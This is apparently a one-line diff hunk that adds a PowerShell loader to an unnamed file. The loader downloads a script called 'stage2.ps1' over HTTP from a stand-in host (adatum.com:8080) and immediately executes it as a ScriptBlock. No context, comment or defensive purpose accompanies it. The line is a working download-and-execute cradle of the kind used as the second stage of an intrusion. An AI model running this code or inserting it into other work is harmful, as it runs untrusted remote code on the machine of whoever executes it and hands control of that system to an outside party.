@@ -1,0 +1,1 @@
+$DownloadUrl = 'http://adatum.com:8080/stage2.ps1'; $RemoteScript = (New-Object Net.WebClient).DownloadString($DownloadUrl); & ([ScriptBlock]::Create($RemoteScript)); [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
